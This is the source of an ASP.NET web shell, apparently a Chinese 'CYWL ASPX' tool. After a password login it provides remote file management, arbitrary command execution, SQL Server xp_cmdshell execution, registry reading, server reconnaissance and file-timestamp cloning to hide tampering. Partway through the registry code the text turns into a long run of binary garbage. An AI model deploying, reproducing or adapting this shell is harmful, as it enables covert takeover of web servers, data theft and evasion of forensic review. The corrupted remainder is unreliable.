<title>CYWL ASPX DM WZJC.CHINACYCC.COM</title>
<%@ Page Language="VB" ContentType="text/html" validaterequest="false" AspCompat="true" Debug="true" %>
<%@ import Namespace="System.IO" %>
<%@ import Namespace="System.Diagnostics" %>
<%@ import Namespace="Microsoft.Win32" %>
<%@ import Namespace="System.Data" %>
<%@ import Namespace="System.Data.OleDb" %>
<script runat="server">

    '---------Setting Start---------
    'Here, modify the default password to yours, MD5 Hash
    Const PASSWORD as string = "b1befef709205575e8e8ba5c5b09e13f"
    'Session name, avoid session crash
    Const SESSIONNAME as string = "webadmin2"
    '---------Setting End---------
    
    Dim SORTFILED As String
    
    Sub Page_load(sender As Object, E As EventArgs)
      Dim error_x as Exception
      Try
        If Session(SESSIONNAME) = 0 Then
            ShowLogin()
        Else
            ShowMain()
            If not IsPostBack Then
                Select Case Request("action")
                    Case "goto"
                        CDir.Text = Request("src")
                        Call ShowFolders(CDir.Text)
                    Case "copy"
                        Call ShowCopy(Request("src"))
                    Case "cut"
                        Call ShowCut(Request("src"))
                    Case "down"
                        Call DownLoadIt(Request("src"))
                    Case "edit"
                        Call ShowEdit(Request("src"))
                    Case "del"
                        Call ShowDel(Request("src"))
                    Case "rename"
                        Call ShowRn(Request("src"))
                    Case "att"
                        Call ShowAtt(Request("src"))
                End Select
            End If
        End If
      Catch error_x
            ShowError(error_x.Message)
      End Try
    End Sub
    
    Sub Login_click(sender As Object, E As EventArgs)
        Dim MD5Pass As String = LCase(FormsAuthentication.HashPasswordForStoringInConfigFile(UPass.Text, "MD5"))
        If MD5Pass=PASSWORD Then
            Session(SESSIONNAME) = 1
            Call ShowMain()
        Else
            Label_Info.Text = "<b>????????????????</b>"
        End If
    End Sub
    
    Sub GoTo_click(sender As Object, E As EventArgs)
        ULOGIN.Visible= False
        MAIN.Visible = True
        FileManager.Visible = True
        CMD.Visible = false
        CloneTime.Visible = False
        SQLROOTKIT.Visible = False
        SysInfo.Visible = False
        Reg.Visible = False
        DATA.Visible = False
        About.Visible = False
        Call ShowFolders(CDir.Text)
    End Sub
    
    Sub ShowError(ErrorMsg As String)
        Label_Info.Text = "<font color=""red""><b>Wrong: </b></font>" & ErrorMsg
    End Sub
    
    Sub ShowMain()
        Label_Info.Text = "111"
        ULOGIN.Visible = False
        MAIN.Visible = True
    End Sub
    
    Sub ShowDrives()
        Label_Drives.Text = "Go To : "
        Label_Drives.Text += "<a href=""?action=goto&src=" & Server.URLEncode(Server.MapPath(".")) & """> . </a> "
        Label_Drives.Text += "<a href=""?action=goto&src=" & Server.URLEncode(Server.MapPath("/")) & """> / </a> "
        dim i as integer
        for i =0 to Directory.GetLogicalDrives().length-1
             Label_Drives.Text += "<a href=""?action=goto&src=" & Directory.GetLogicalDrives(i) & """>" & Directory.GetLogicalDrives(i) & " </a>"
        next
    End Sub
    
    Sub Logout_click(sender As Object, E As EventArgs)
        Session.Abandon()
        Label_Info.Text = "<b>???!</b>"
        Call ShowLogin()
    End Sub
    
    Sub ShowFileM(sender As Object, E As EventArgs)
        ULOGIN.Visible= False
        MAIN.Visible = True
        FileManager.Visible = True
        CMD.Visible = False
        CloneTime.Visible = False
        SQLROOTKIT.Visible = False
        SysInfo.Visible = False
        Reg.Visible = False
        DATA.Visible = False
        About.Visible = False
        If CDir.Text = "" Then
            CDir.Text = Server.MapPath(".")
        End If
        Call ShowFolders(CDir.Text)
    End Sub
    
    Sub ShowFolders(FPath As String)
      Dim error_x as Exception
      Try
         Call ShowDrives()
        If right(FPath,1)<>"\" Then
            FPath += "\"
        End If
    
        dim xdir as directoryinfo
           dim mydir as new DirectoryInfo(FPath)
           dim xfile as fileinfo
        Label_Files.Text = "<table width=""90%"" border=""0"" align=""center"">"
        Label_Files.Text += "<tr><td width=""40%""><b>Name</b></td><td width=""15%""><b>Size</b></td>"
        Label_Files.Text += "<td width=""20%""><b>ModifyTime</b></td><td width=""25%""><b>Operate</b></td></tr>"
        Label_Files.Text += "<tr><td><tr><td><a href='?action=goto&src="
        Dim tmp As String
        If Len(FPath) < 4 Then
            tmp = server.UrlEncode(FPath)
        Else
            tmp = server.UrlEncode(Directory.GetParent(Left(FPath,Len(FPath)-1)).ToString())
        End If
        Label_Files.Text += tmp & "'><i>|Parent Directory|</i></a></td></tr>"
        For each xdir in mydir.getdirectories()
            Label_Files.Text += "<tr><td>"
            dim filepath as string = server.UrlEncode(FPath  & xdir.name)
            Label_Files.Text += "<a href='?action=goto&src=" & filepath & "\" & "'>" & xdir.name & "</a></td>"
            Label_Files.Text += "<td>&lt;dir&gt;</td>"
            Label_Files.Text += "<td>" & Directory.GetLastWriteTime(FPath & "\" & xdir.name) & "</td>"
            Label_Files.Text += "<td><a href='?action=cut&src=" & filepath & "\'  target='_blank'>Cut" & "</a>|"
            Label_Files.Text += "<a href='?action=copy&src=" & filepath & "\'  target='_blank'>Copy</a>|"
            Label_Files.Text += "<a href='?action=rename&src=" & filepath & "' target='_blank'>Ren</a>|"
            Label_Files.Text += "<a href='?action=att&src=" & filepath & "\'" & "' target=_blank'>Att</a>|"
            Label_Files.Text += "<a href='?action=del&src=" & filepath & "\'" & "' target=_blank'>Del</a></td>"
            Label_Files.Text += "</tr>"
        Next
        Label_Files.Text += "</td></tr><tr><td>"
        For each xfile in mydir.getfiles()
            dim filepath2 as string
            filepath2=server.UrlEncode(FPath & xfile.name)
            Label_Files.Text += "<tr><td>" & xfile.name & "</td>"
            Label_Files.Text += "<td>" & GetSize(xfile.length) & "</td>"
            Label_Files.Text += "<td>" & file.GetLastWriteTime(FPath  & xfile.name) & "</td>"
            Label_Files.Text += "<td><a href='?action=edit&src=" & filepath2 & "' target='_blank'>Edit</a>|"
            Label_Files.Text += "<a href='?action=cut&src=" & filepath2 & "' target='_blank'>Cut</a>|"
            Label_Files.Text += "<a href='?action=copy&src=" & filepath2 & "' target='_blank'>Copy</a>|"
            Label_Files.Text += "<a href='?action=rename&src=" & filepath2 & "' target='_blank'>Ren</a>|"
            Label_Files.Text += "<a href='?action=down&src=" & filepath2 & "'>Down</a>|"
            Label_Files.Text += "<a href='?action=att&src=" & filepath2 & "' target=_blank'>Att</a>|"
            Label_Files.Text += "<a href='?action=del&src=" & filepath2 & "' target=_blank'>Del</a></td>"
            Label_Files.Text += "</tr>"
        Next
        Label_Files.Text += "</table>"
       Catch error_x
               ShowError(error_x.Message)
       End Try
    End Sub
    
    Function GetSize(temp)
          if temp < 1024 then
             GetSize=temp & " bytes"
          else
             if temp\1024 < 1024 then
                GetSize=temp\1024 & " KB"
             else
                if temp\1024\1024 < 1024 then
                       GetSize=temp\1024\1024 & " MB"
                else
                       GetSize=temp\1024\1024\1024 & " GB"
                end if
             end if
          end if
    End Function
    
    Sub ShowLogin()
        ULOGIN.Visible= True
        MAIN.Visible = False
        FileManager.Visible = False
        CMD.Visible = False
        CloneTime.Visible = False
        SQLROOTKIT.Visible = False
        SysInfo.Visible = False
        Reg.Visible = False
        DATA.Visible = False
        About.Visible = False
    End Sub
    
    'Show Cmd
    Sub Button_showcmd_Click(sender As Object, E As EventArgs)
        ULOGIN.Visible = False
        MAIN.Visible = True
        FileManager.Visible = False
        CMD.Visible = True
        CloneTime.Visible = False
        SQLROOTKIT.Visible = False
        SysInfo.Visible = False
        Reg.Visible = False
        DATA.Visible = False
        About.Visible = False
    End Sub
    
    'Show clonetime
    Sub Button_showclone_Click(sender As Object, E As EventArgs)
        ULOGIN.Visible = False
        MAIN.Visible = True
        FileManager.Visible = False
        CMD.Visible = False
        CloneTime.Visible = True
        SQLROOTKIT.Visible = False
        SysInfo.Visible = False
        Reg.Visible = False
        DATA.Visible = False
        About.Visible = False
    End Sub
    
    Sub Button_showcmdshell_Click(sender As Object, E As EventArgs)
        ULOGIN.Visible = False
        MAIN.Visible = True
        FileManager.Visible = False
        CMD.Visible = False
        CloneTime.Visible = False
        SQLROOTKIT.Visible = True
        SysInfo.Visible = False
        Reg.Visible = False
        DATA.Visible = False
        About.Visible = False
    End Sub
    
    Sub Button_showinfo_Click(sender As Object, E As EventArgs)
        ULOGIN.Visible = False
        MAIN.Visible = True
        FileManager.Visible = False
        CMD.Visible = False
        CloneTime.Visible = False
        SQLROOTKIT.Visible = False
        SysInfo.Visible = True
        Reg.Visible = False
        DATA.Visible = False
        About.Visible = False
        ServerIP.Text = request.ServerVariables("LOCAL_ADDR")
        MachineName.Text = Environment.MachineName
        UserDomainName.Text = Environment.UserDomainName.ToString()
        UserName.Text = Environment.UserName
        OS.Text = Environment.OSVersion.ToString()
        StartTime.Text = GetStartedTime(Environment.Tickcount) & "Hours"
        NowTime.Text = Now()
        IISV.Text = request.ServerVariables("SERVER_SOFTWARE")
        HTTPS.Text = request.ServerVariables("HTTPS")
        PATHS.Text = request.ServerVariables("PATH_INFO")
        PATHS2.Text = request.ServerVariables("PATH_TRANSLATED")
        PORT.Text = request.ServerVariables("SERVER_PORT")
        SID.Text = Session.SessionID
    End Sub
    
    Function GetStartedTime(ms)
          GetStartedTime=cint(ms/(1000*60*60))
    End function
    
    Sub ShowReg(Src As Object, E As EventArgs)
        ULOGIN.Visible = False
        MAIN.Visible = True
        FileManager.Visible = False
        CMD.Visible = False
        CloneTime.Visible = False
        SQLROOTKIT.Visible = False
        SysInfo.Visible = False
        Reg.Visible = True
        DATA.Visible = False
        About.Visible = False
    End Sub
    
    Sub ShowData(Src As Object, E As EventArgs)
        ULOGIN.Visible = False
        MAIN.Visible = True
        FileManager.Visible = False
        CMD.Visible = False
        CloneTime.Visible = False
        SQLROOTKIT.Visible = False
        SysInfo.Visible = False
        Reg.Visible = False
        DATA.Visible = True
        About.Visible = False
    End Sub
    
    Sub ShowAbout(Src As Object, E As EventArgs)
        ULOGIN.Visible = False
        MAIN.Visible = True
        FileManager.Visible = False
        CMD.Visible = False
        CloneTime.Visible = False
        SQLROOTKIT.Visible = False
        SysInfo.Visible = False
        Reg.Visible = False
        DATA.Visible = False
        About.Visible = True
    End Sub
    
    Sub ShowEdit( filepath as string)
        ULOGIN.Visible = False
        MAIN.Visible = false
        FileManager.Visible = False
        CMD.Visible = False
        CloneTime.Visible = False
        SQLROOTKIT.Visible = False
        SysInfo.Visible = False
        Reg.Visible = False
        DATA.Visible = False
        About.Visible = False
        File_Edit.Visible = true
        edited_path.Text = filepath
        dim myread as new streamreader(filepath, encoding.default)
           edited_path.text = filepath
           edited_content.text=myread.readtoend
           myread.close()
    End Sub
    
    Sub ShowDel( filepath as string)
        MAIN.Visible = false
        FileManager.Visible = False
        File_del.Visible = True
        label_del.Text = "Are u sure delete file/Folder <b>" & filepath & "</b> ?"
    End Sub
    
    Sub ShowRn( filepath as string)
        MAIN.Visible = false
        FileManager.Visible = False
        File_Rename.Visible = True
        btn_rename.Text = path.getfilename(filepath)
    End Sub
    
    Sub RunCMD(Src As Object, E As EventArgs)
        Dim error_x as Exception
          Try
        Dim myProcess As New Process()
        Dim myProcessStartInfo As New ProcessStartInfo(cmdPath.Text)
        myProcessStartInfo.UseShellExecute = False
        myProcessStartInfo.RedirectStandardOutput = true
        myProcess.StartInfo = myProcessStartInfo
        myProcessStartInfo.Arguments = CMDCommand.text
        myProcess.Start()
        Dim myStreamReader As StreamReader = myProcess.StandardOutput
        Dim myString As String = myStreamReader.Readtoend()
        myProcess.Close()
        mystring=replace(mystring,"<","&lt;")
        mystring=replace(mystring,">","&gt;")
        CMDresult.text = "<pre>" & mystring & "</pre>"
          Catch error_x
               ShowError(error_x.Message)
          End Try
    End Sub
    
    Sub GoCloneTime(Src As Object, E As EventArgs)
          Dim error_x as Exception
          Try
          Dim thisfile As FileInfo =New FileInfo(time1.Text)
          Dim thatfile As FileInfo =New FileInfo(time2.Text)
          thisfile.LastWriteTime = thatfile.LastWriteTime
          thisfile.LastAccessTime = thatfile.LastAccessTime
          thisfile.CreationTime = thatfile.CreationTime
          Label_cloneResult.Text = "<font color=""red"">Clone Time Success!</font>"
          Catch error_x
               ShowError(error_x.Message)
          End Try
    End Sub
    
    Sub CMDSHELL(Src As Object, E As EventArgs)
            Dim error_x as Exception
          Try
            Dim adoConn,strQuery,recResult,strResult
                 adoConn=Server.CreateObject("ADODB.Connection")
                 adoConn.Open(ConStr.Text)
                 If Sqlcmd.Text<>"" Then
                    strQuery = "exec master.dbo.xp_cmdshell '" & Sqlcmd.Text & "'"
                        recResult = adoConn.Execute(strQuery)
                     If NOT recResult.EOF Then
                        Do While NOT recResult.EOF
                            strResult = strResult & chr(13) & recResult(0).value
                            recResult.MoveNext
                        Loop
                     End if
                     recResult = Nothing
                     strResult = Replace(strResult," ","&nbsp;")
                     strResult = Replace(strResult,"<","&lt;")
                     strResult = Replace(strResult,">","&gt;")
                    resultSQL.Text=SqlCMD.Text & vbcrlf & "<pre>" & strResult & "</pre>"
                 End if
                  adoConn.Close
           Catch error_x
               ShowError(error_x.Message)
          End Try
    End Sub
    
    Sub ReadReg(Src As Object, E As EventArgs)
              Dim error_x as Exception
        Try
              Dim hu As String = RegKey.Text
              Dim rk As RegistryKey
              Select Mid( hu ,1 , Instr( hu,"\" )-1 )
                 case "HKEY_LOCAL_MACHINE"
                    rk = Registry.LocalMachine.OpenSubKey( Right(hu , Len(hu) - Instr( hu,"\" )) , 0 )
                 case "HKEY_CLASSES_ROOT"
                    rk = Registry.ClassesRoot.Open�����?$C0��ͧ�	��@9Hw�rHo?�q�%����JP�H]Hw��/o�)�E�z���z�+�V�6/*�d�e`�8�������` ���������0��9��L|�	p�6�)�Y��F�w�YW�O����ft��UGx�>h�BP��Ԫg�1���/|�L>s\_\��GLu��������AwSqm�;�B�`����p`zK��0�\�����9��b�tv  �>P߸e��N�X��G���f���"�]����E%�	v�Y)Oܔ j���(h}���Np!�AC_�PX���7]%�,Y.ȯ��W���To8�'�.��PX>����}�OL�13=e)�a�&׺�<�n��."�W���c��22���^��l�#*��F? _�E.��8���r;�� Kç��q/��f!7�O�ZV��"�S��tt�L�)8��[=�z,ݘ���z�!`w�J��͓8B��J/>����C/I$����]Ws���O3Eq�Q�?S���	�.��KT&-�z��{��LT}������]��7��V��dr�b��h�U.�7m ���\���1u�ƌe�c���h�F�
HT4��ﶏq8�R�"/�n��N�����P�*z?��ZWīw߬h�ǂ�6ػQ��Ӊߒv�<��-	IQ���iI�����:���?���}�1�E�b��W�<���H���ZC�5���O�I&H��M#��N��3��G#G�M3�V,r��X�?YD`G�lG��U��Ao^@��nȌ��-Hp��s�S����!�Tr����:�-u�NR�v�Z	�������J\0����|��~赎��[�~���D�0c�Ǟ�c��,�)�b+�2��o��_)S`���m�`T��9�vb�%�$�}����Ý-��*�]}Q�r��g��.�ofӸ�򎦵p�(�6���GN�=�#�ݘeݚ�r�Y�F7H�t�=��B�)�i�-�"�X+��	2�"�w)g%{5���,�S�����>!��`⒘��4�?�HB���e�Luk��z¼��՞]�{�7�n
)6&�.��!�X"��h�ܗ�'��_5�lĆ.G/�߂�hެ���H�V�eHSb� p-��!�x�r߮�	���跕}|�g����v� s�{���$ח�'�Р����:����8`���!@��Y���m�S�k�/k�E՟����N!�j�9�dZ�_[���$m�i�p���8k���o1�-4=�����qs f�*/�aC���zH�~�6��5���������z��wo5�3I9��g%<wKSl���G�/*h�� I1>�KܫE�^�<Į:�[�;��`��~��S|�E��/�Q>`�!2�?R�F�,[�V-���EKk+ڮ�>ߖ�l�'��b�r��z�;Ŭ���އ9e��.���M�(�Fꍅ+xc�-�)g�,�x�����C��vة��?%��m��D�
@�ُ����F^�d��,��±�C�Ҳ�sR|2����n��6a8i�m�� �Ɩ~*���GQ�SC` ;�:b&��Pױ��� ��mP�,��x�‒�i��P~�"2��a�i�y�r�`���3��N���<29�$����.캂\`hP4te$�'ޜ��+H#��z��>�~z�ӗ�f���dL�Y���#:�8O=p�p_
���I��$ ��#!rc�́%����<߰-��ZdQ���K�~�w���}��X���ȕ��-_�v�\�&�3�	
����g3phJ��+��*�+���!��h�lsm}J��	��>],�&�w�R~:���A@�lrϧ��:v�\�o^���Е`c��������q3Mʮo��CJ�K�;7�y%�xV��b.��FEb%K�u[ ��U�E������d���
�K�}n��*s�Vn�	���Y�P�y�^sa�I6.H�0ާ�4Y�.��HX�7:��2�RvH̩�ZJɮ,0��G��<	�2���8���0���![�^�T��L�O�ʙy!4��.{:��3�x4�૲Ni�S������fIH'XɎs%}�8�s�s)R�=�H�V�@G-�%� +����!sw�2!K�FZ��ƣ'�ZN(��x4��3��M�޻VB�+-U��D�M���)so�[��>�|�����5��v�>�,B$�˟��:�S��-�0����NNp8+ �Vw>���Dٱx����ʋ�&�[�4����y����WmJ��Lo!|]:�
Ѕ$��r����y�#����7��%�.2r�Χ���.ǂ���7ק�����c�ڢBj�|-7��F��d�����y�w�����5��ذ�QvN6(L�����w�#c�l�&>߆Ĥ��{���W�BxGh������[�[��Ƕ�z�U�T�/��6�M�,�S`��7���2�t�+�e��<�_{�9����S�dN������kD��}Ӫ*�S|Mm��*���B��tNX Z�wi�siwÁ
E�u�UO,��)�ٗ�^H`������7D/j+���o�6H�^P��Nft��rU�H2���^gA��0&�����a�v��laxR�QU� �ab.�5Wo䀤�H�<5�yz�d�����B)����<�h�2�j5�Ioܧl�8�	{�*Ƚ&��=g�԰Y
�w[iR/����Zn��/���.��p�-#����Y��ǀ�*c����s�JP��z�O�h�R$
�%H�ʮ����is��䧾˶��#5��E�N9������21H�z:$"�.�I�}j߁p�p�}A��aw���,��,2{�� ������C��lm��*�@������[� �X΀��e,�x8��7V�����e�GI����餍��j�t����� �H����u�+Za��^��7&��"C*���(lM�G�a\N�^$s�8�*��)�s��qg|9�?��D�ǭ�ͦ"	����-�4?!�ľ:%��(�	qƔ璁s����������A%��]y��`�fD�v�r L���F�E�� o��`$�U�4e���'u�T�c\�gX�i>�j.��X��poV��V��'uV;,!.���V��Pg���³T۝�<6ozD��/,�a��3y9��C`0� T��v�z���Ό�P�β�ke�<�t�E{���W������,��u�<�k�������4�m�,�|"0�[���m@4m�-��>A�!f�J����*����Ȁ�</�u����M��_?`�^	@�R���j}'��3���Gr}����,���8���T����}{��*t2 7��K~�ɜ��G�� �������iش�� {��?7�����FaYrݷ���q5^��xS�v�c�5��Ȟ���_��ݐ@�wi�I ��
�X���������v�S�-d�(-����(t�]f�t��A�� �-	�X;:�p'S��#�@�v*��d��� �*�QJ��2",�#Z�%���7@LI�#8?[I�,ݙ	���[�SȝU�~v��A�d(2�i߿n�V^&���~%a��[�x�{W�5���)v���[��ͥ��^�݄��g�0l_`�̩u�m�}�����nkąw�ۊȼ$��m���#��N,u��M!&�@���[|z�#�PK��ww_�U����5���;m�S��xB[X��l�5�`�$�ο0G�x�[�zM�:����G��H�K2N�;��gԀId�=H;�$~2YF�j��ع RT�E�>\��\.�˜t�N��M�@���XX�᩷t?DS
Of�w����/�"FU��|��-)��	P�Ӈ���E�#�Z�����j�w����@mi�کA�=C�� ;'zO�Y���c��7���1;Tu��T4*b�4�RH��J�O��o_���y��	ﮠӅ�QV�-�y��[�Li�6��6.b�;;O�&A]�FI�f�:��ܐ��E�@���t��5�	hr*�H�Z;����K�s"�1���_/#�v��D�0s�	TY@��@}l�X��:L�5*�k���G�������`�i��O��ռ���&�\A�۱C�G=��k90!h�~�H[�ًz�OO�<�;��Eˮ�[n����h�'5WkZE�+P��"-ۿu�F�w�v�$���3鱹H���Qj96~�@c�Z��/ ǌW��j�-�Q�0eM�~vF���_�a��P����߳�6 �-�i����0����Qq4�f]��1���P#�]1C��LO��
6��u�W@��ܼ{P��u�H혍�xjW��n&*�ӮI��5*NE��cK�X������6�]o��I:��jS� �]�>b����q��!����z;���n4�$�9�ǜ��(<�,������9a��[�"����\ۀ�b�)�dm�!�	 x��=����A�k���ڦ8T| ���U=C�K�y�[�#r�G���T�B$I�z&BO�Y�%"\����B�čVH��=�h�#\!(r}W�݌���v��i����
�E��Mz� � ��/+Uۦ���T�����nrM�Q	��^�	���5�{���)˔��?���V��mV��$Q��X�u�����-(�c,>'.����?���������)�� ښz�4x�� �>*s�q�+���ЈY����|�Tp���$G�(>�����>lP20Q/�X�y�sz���7b�y1:���9J�z1���U�`�)n ��>��@��}��D3T��{��L� *�2�Q�/�n�,�띶|��tBe ��FN��p^]�$���>>�a1,桽n������TCo�Y�v���:˟�Q��+�S:���?�D
ۦヱ�Cx�Y�_~��ͦ�[?���ې2N�ݾ����xm��p���l����R?tٯ�R� rʌ�lc&���_*�Ré�cֈ�d�SE��g�\f�rt�tbI��_�X�KWJ��q��cZ��Ѵ�:��z^�$��՜<��M�u�F9�6ݯ�*��xӁ�"C����~�]Ǽ�Pf<SN!^w��>c6�&q�n�9R���\ߌ��ICєD��U�7v_و�I�H��E4e�8�0Q&��uJ�C�VXV��b�rL[�Bm[L���D�4!��!����D�����)�2���%�H��7Bcv��������9K�9���P��d�%y����$Ol��)����f��N&<�F�u�=����>���u:l&�?�?�����c�tA8Hd���̂��R��/{楖��|�����_P�`6�V�~����#��m����E�a&/I/s�a��;H���<�4$S��H\f��jV@X���w%��:�Q���5sPE��<3�@��Zt����g�#9sĽ:A��'�	06��~�(T�]�t����|<{G�@؃{e�+)�&w�˦33M�����<�p��*Uv�%�2%o�陳����g�-�,a�
��>�&y����T��m��F�z�W�����e/2�6�!�hI�
8S�W�Z�y�^�fs�R��a��[%����]��.�x��v!h�L"��,���9� �7��W➄3ױ�1�&�-S�X��mw�3������M|�F�3�J�i���S��S����ɗ�B�(3bX@;#�Rb��vܭ��"�m���p}��z��2����c�m݈�t���	 9,�ͪ9��Y�[F/m�	����~��k1�;l�\|�:���h�i���������Z<H��}pF�kL߲\��x:x���&�"�3I�]���lPcd���a�:� �li$���!7�7�@|�9���˺�F�̂(�b��U~�k���I�v��Ԟ��9<�p'Bׁk�x���*��i}���|��� 	ݎ�3�4B�?g���{H��,�PM�I�%qI����t,*0۱4���L~�e�Ѥ�3݂8�
iGHJ�c�:ɍB�cb�g��Ɲm����6�n�k�.��b. r8�S���7Q_��cIW[ȡ��nZc>ȕc� ��������#�@�2�]�>،��E�4q`�Ꝋ�1�_�A�?U��p%/�ząN�]�.
&�⇣s-��:Er�u,JW�;��}��B��C��D9wx��:|b��K�1ǈ ��mV�3=���Ō r�L���:�.a{	2;4T��L���I�\$P��UC`g��^�H;�\��F�?Xbm�mL?��l�Yס��� ��C˴G�YB��r�^�lAn�,LҒ�P����@^;	���b�[�4أ�ߩ!}ͭ~!�{�A�g��_F(���4'���iܗ�**���T͉�w�B�r|W$:x.�λ	����3<=��|�$8x��s���M�6^ta�fe�z��j��x���0�!Q���^^>#��۴��wĺ��X���]��^r�xe/XXߍk�wAS�nNp��RՌ[��J7��s7S����N!7$r��db@Z�o�D�>y��� R�W����A��3Mg�)�|k�d�7y|��:1���\6$2JV�cɗ5OVw��Ch���%Ӎx��4���\f\��7l��/��r�(1�j渉rU��D� �����#�`عt��m�[��vt����PZ!Q��4�O�C*W�@{2=�k��|��G�+�ۚ�{�Fwg���`F�Ȇ1úwp�?`>U��Ø7���Ձ0������2��.l����T��+��ᄠ��`͇*Ʈ��k?�X�����v�g��fw�8�����9kWk��������1�l�hD@�r_�2�O-�)�a>�Dy�M�s[�J�[�*���	�t���9Lov��N�%e�B˥~5��5_�G�Fb�2�� ʪ�X j��SI�}x�6������ҋͺp��{��#n��U���:v��F���N��phu[G�QkZ_~71�S[��B;��<���3�d��G��=�/��r2BZ�ך�����&����%��@��v�0j7g�TԹq@��؈��Yf傯��R���T�CB��������n?�?kW���f5DEw"��r�}�\����@�^����4���X!*aM_�c��):j�:2�L��[~��%�R��G�&Ss
��6^����=L�:XQ��bZ�Ԧ����C�Y� l#��O�)�t��n���~2^��hZ.���`a'q�,���*��J�&v
By�xХ�������h�͔��wD@���FFf��G�R�.<eH��_�&&mq^�P%�(+ �-�W�����3�!��
$��,K��x�͘b�ǋ|����
R��l�PD�շ��$���hʃR�&W��TW��D!������`��ܔ��ˈ�P�
<;"��b����d4���d��Zֲ��L��r����6��	��A�`�4���.���r��H�z`�DԄ%��B�{rR*g\ �F7��iiI�'�ϗ�a�Gv.�d�����b���a�1L��E>Մ�Sb&�ӗfU�~26��d�A�Tw󨪵�fbT�pR�*7�H�٥�9�g��u�Ƒλ�xÃi�
�ǵ��c����-����C��a�'�O�`9]S�PMY�a|'{�Kӹw�̝^��/��)C@���#L:S~4�S�|���õ�/�؇e.b��S�oDD�.�K��&�P��s�j&�?Aq��R�)�_^1g�.�U*���u�QK�<����套$2����~
3w�"�d���b�SO�=����OΖ�Ri�jZ$��hKM֗b����_�k}"mG�����,"����t���;xSP���X&`B��:4��kS���s[4[�eYM{?���G�n
W������a�F�߄��DUjn��K��F�vN\�]��et�@�戾+E�q	�UKдX_q�3�{%�>@�96n�I��I_\�ͨ-$�ݽǌ�	"�n<���Y;C�2YնV|��5f86��}�
�b�$�k�fW~�.�5��L.�qhг���rC|�t�Yd'�#���Y�ڜy�)k0s��)�����1�Q���\��y����3Z�D�����bOYH]ebf�������`;柒2����H*@(��1����H� qOռ�c�O�a��R*<��܉�Pa��5���T��P�}w������Tݟ�y���Ӡ��]7E\呲0P
�D�'4^�ߺ9r偶���v4�H
�J��oo����wxV�.�!�e��d%Hڄ@�ڡx:��݁pR+Z]�� I+�r5D��KrwO4�--X�����^з�B�J&h�����@ᬬ;�J)p�)&�3�k���*>!��	]&L�e�=���W���V:����=�`¶�' l��u�v��{�灿1-h��b���fC�?���ϻ�5�w��aU�&a$�&^�pq��[�7
y8�zݰ�mڔ���>j�,Y�g�U�,��Ma�!���.��ڨ���;~�����ۿ�D��p$�����XN�ad��ƺĶ��s+�Lr�ƍ?�py��GZgx�l�62��q:z�Im�u�Ɣ�bp֌a:��~�Ǽ��]r�]���wJ���6��PFf��~��g~v��"U����!�)��/��[=)��"���r�B\9��W�.���h���.o>�L��Ox��d˵�*>]������� �J���=i,u_����ҥ��/��]�Vne�:U��UX@h;Id��'����d�W@b��8�q2�/� ��bg/�3�y�*9�	"3�'�C����;L\bU��ߎ-
qP�a��VB���֊�xJq�O��'�}�Sp<)�zz��
݁g�TW
n�mI��}v����b����?�Q��a �5�7����#*�vG�e7G��'R�fHVɓ@��à�%k���$U���& ��$�u��Ҿ�ָv�Q�+������!�눌��sӞ)3�G��!@T�� $%P�����.��[	�~�x��׌�����V���F�~�`�}p	Ր�c�4;�,�)�cA�͡��ƌ��D����dԕ8}�bb�ڙt��}��w��/�N?�;=9�2����4rzNz������h�~r��(R�}�����虾� �Y��6uHNa0���B��M�-���|m��e3�"��bee{�K0����{coǱ��a�45���>�4@$*xk�����L��{{�^�=�ў]��;�n�$~��.]V%�Xp���hre��'���;u�3��/����N<tn5�Y��"�;]�@xIa�!�x������	��̣�++1���� ��<Yh����c���p��m�-L8`�dj�9A+iU��U�U�S�sǭD��� 2� �j!}�|Y9�JuP�q�i�����<�/)1��dM6}�����ʙ��]��M�aCY�,�|��~��"�6����8��LA���D�~�w�^�;�s��V6!<w�wt�C���/*�e�I�z�AW`���_�DE�:xN���G_�'�4�E���Q���%2�?R�FX�[�>EM?����K+�i��:ߖ�l�'jC�r��z�Q��W��O���95}��l��˹,�FaK�Fp�/�I$g�,��`�Q���- SX{��pw9��E� >����&�͘ަ�B��\3��g�_4psR|b�~��n��a8�;Dl��Qu��~G_*�q{�P�S�8�:5���Q�<ݵ ����,�0W��=	8�}�"eX�@�iC�p�`��0��`��<2�{����F��\7��te�t�$ޜ��P�+Htu Z�����zzف�Fe��� �l��!��#:�P�>p�'��*�� ���$ R�2 v����������ܰ-�^�DQ�}�O�(���_�����X��̕;�<���y�z��� R�	�8oOi�����8ZBX�9��:t\�qH���63
�����>H"&�wv�v|:�������Lr�,��>v��-p>�R�+����c���riOn#�q����XAJ�ZF��)eǐW���}�aS�eK;p�@�LU�E��*Ӕc���b�Ȫ}
��*���Rn�a@�Y�uRs�3a v�6.è��@4Y�����p��2�RvJ�V�2*��D`�G��qQ���Pl��0���@�D�^�P��&��.��y$^�,.{:^�dw4��πViH��������LŤZɎ �Pvs����7�=q�.�y���@-)�O�������K r��!K�͔n�ȣ'�hV((���a4�@�'�Mϴ�<G�.GPl�krD�M�.*�&so�?��>"�?;���|�_��E>�,( ���+�:xG��-oq�(<�WFp��$>V%V���mQY��x-����5�R�q�Et�" �����W�_ov��bP�$��&۰@n5����w����$���+�6������f�3�.����[�8c��T;}��.�Q�������Pl���Ѓ1?����;�ڽ^�O��6�w>+_,�r����{���CxGhN�������[�*����Lq�V�/���M묌7���7�x��0�4�t���~x��|;-�-�Ԃ��-S�O��n�kۈ�
H�aEm_�3x�8��E��t���`yT'�"����
7�&�u�^���y�PH�Dl���E��3�wD��6/��r+�.4t냏M��Y�<"��C]�Q��[��E�Վ�ד����*&b.B�kԫg�oNL�U�<k1�`�;�^gҹ@�;��<�X�T��F������oܧ劸X�Y��ٯ��=g�W\I'�u[?�޽6*�ZnK-�!W.��8�����
��[��'����`��J�����O��L�R$
��=�ʪ���r�)s�U���'j�ݮq�
���*y7r�-�i�&i\1Þ^2N"��;K*�}:7/l�p31e�UIE{А�}��.��B<��J���C��hm�V?�$��8�҃��H |�|�G�'��lty,�&���S��������@�,]:�z�`��(�eqt���e���مa�v�Wa��^N+�ȲӺ��mhl'��בN�^�fGv�8�_��Fs���Q3q�� 5ǭ���F�����-�T���m��V
<������	����U�W���J���^���+a�U�9���3�v��lh�j�bºM���`��qA�h���'�:DO����ឰT҂�5�[ۺ�poeV{m��'�[�:!.y#�Jϐ��6lD��d��5oz�lؓ�!���1����c���vl�z>u�ʌ�!e_t������T�E
��W���2�����u^�13���R�����i��M�,k�"azԢ�m@˻%�K��4�FFw� �ג�����H���
u��·Ɯ�5?7�^Y�o�C
